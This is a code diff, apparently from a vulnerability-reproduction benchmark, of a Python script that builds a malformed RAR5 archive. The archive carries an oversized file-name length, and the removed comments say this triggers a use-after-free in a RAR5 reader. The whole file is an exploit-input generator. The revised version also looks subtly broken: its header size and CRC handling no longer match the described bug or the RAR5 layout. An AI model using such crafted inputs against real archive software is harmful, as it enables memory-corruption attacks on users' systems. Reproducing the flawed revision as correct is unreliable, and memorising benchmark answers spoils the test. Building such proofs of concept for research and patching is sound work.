@@ -1,65 +1,74 @@
 import struct
-import zlib
+import binascii
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        def to_vint(val):
-            if val == 0:
-                return b'\x00'
-            out = b''
-            while val >= 0x80:
-                out += bytes([(val & 0x7f) | 0x80])
-                val >>= 7
-            out += bytes([val])
-            return out
-
         # RAR5 Signature
         sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"
-
-        # --- Main Archive Header (Type 1) ---
-        # Fields: Type(1), Flags(0), ArchFlags(0)
-        mh_fields = to_vint(1) + to_vint(0) + to_vint(0)
-        mh_size = len(mh_fields)
-        mh_raw = to_vint(mh_size) + mh_fields
-        mh_crc = zlib.crc32(mh_raw) & 0xFFFFFFFF
-        mh_block = struct.pack('<I', mh_crc) + mh_raw
-
-        # --- File Header (Type 2) ---
-        # Vulnerability Logic:
-        # The RAR5 reader reads the NameLength, allocates memory, reads the Name,
-        # and ONLY THEN checks if the NameLength is valid (e.g. fits within the header block).
-        # We construct a header where NameLength (1059) > Declared Header Size (~9).
-        # This forces the parser to read data from the stream that logicallly shouldn't belong to the name,
-        # triggering the validation error after allocation/read. The error path leads to UAF.
         
-        # Target length is 1089 bytes.
-        # Overhead: Sig(8) + MH(8) + FH_Header(14) = 30 bytes.
-        # Name Data: 1089 - 30 = 1059 bytes.
+        def to_vint(v):
+            if v == 0:
+                return b'\x00'
+            out = bytearray()
+            while v > 0:
+                part = v & 0x7F
+                v >>= 7
+                if v > 0:
+                    out.append(part | 0x80)
+                else:
+                    out.append(part)
+            return bytes(out)
+
+        def get_crc(b):
+            return struct.pack("<I", binascii.crc32(b) & 0xFFFFFFFF)
+
+        # Main Header (Type 1)
+        # Structure: CRC(4) | Size(VINT) | Type(VINT) | Flags(VINT)
+        # Body starts at Type.
+        mh_type = to_vint(1)
+        mh_flags = to_vint(0)
+        mh_body = mh_type + mh_flags
+        mh_size = to_vint(len(mh_body))
+        mh_crc = get_crc(mh_body)
+        
+        main_header = mh_crc + mh_size + mh_body
+
+        # File Header (Type 2)
+        # We target a total length of 1089 bytes to match ground truth.
+        # Signature (8) + Main Header (7) = 15 bytes.
+        # Remaining: 1074 bytes for the File Header.
+        
+        # File Header Structure:
+        # CRC(4) + Size(VINT) + GenericBody
+        # GenericBody: Type(VINT) + Flags(VINT) + SpecificBody
+        # SpecificBody: FileFlags(VINT) + UnpSize(VINT) + Attr(VINT) + Comp(VINT) + OS(VINT) + NameLen(VINT) + Name(N)
+        
+        # Approximate overhead calculation:
+        # CRC(4) + Size(2) + Type(1) + Flags(1) = 8 bytes generic overhead.
+        # Specific fields:
+        # FileFlags(1) + UnpSize(1) + Attr(1) + Comp(1) + OS(1) + NameLen(2) = 7 bytes.
+        # Total overhead ~ 15 bytes.
+        # 1074 - 15 = 1059 bytes for name.
+        
         name_len = 1059
-        name_data = b'A' * name_len
-
-        # File Header Fields
-        # Order: FileFlags, UnpackedSize, Attributes, Compression, HostOS, NameLength
-        fh_fields = (
-            to_vint(0) + # FileFlags
-            to_vint(0) + # UnpackedSize
-            to_vint(0) + # Attributes
-            to_vint(0) + # Compression
-            to_vint(0) + # HostOS
-            to_vint(name_len)
-        )
+        name = b"A" * name_len
         
-        # Block Header content
-        fh_type = 2
-        fh_flags = 0 
-        fh_content = to_vint(fh_type) + to_vint(fh_flags) + fh_fields
+        fh_type = to_vint(2)
+        fh_flags = to_vint(0) # Generic flags
         
-        # We declare the header size to match the content ONLY (excluding the name data)
-        # This makes the "NameLength > remaining_header_size" check fail.
-        declared_size = len(fh_content)
+        fh_file_flags = to_vint(0)
+        fh_unp_size = to_vint(0)
+        fh_attr = to_vint(0)
+        fh_comp = to_vint(0)
+        fh_os = to_vint(0)
+        fh_name_len = to_vint(name_len)
         
-        fh_raw = to_vint(declared_size) + fh_content
-        fh_crc = zlib.crc32(fh_raw) & 0xFFFFFFFF
-        fh_block = struct.pack('<I', fh_crc) + fh_raw
+        fh_specific = fh_file_flags + fh_unp_size + fh_attr + fh_comp + fh_os + fh_name_len + name
+        fh_body = fh_type + fh_flags + fh_specific
         
-        return sig + mh_block + fh_block + name_data
+        fh_size = to_vint(len(fh_body))
+        fh_crc = get_crc(fh_body)
+        
+        file_header = fh_crc + fh_size + fh_body
+        
+        return sig + main_header + file_header
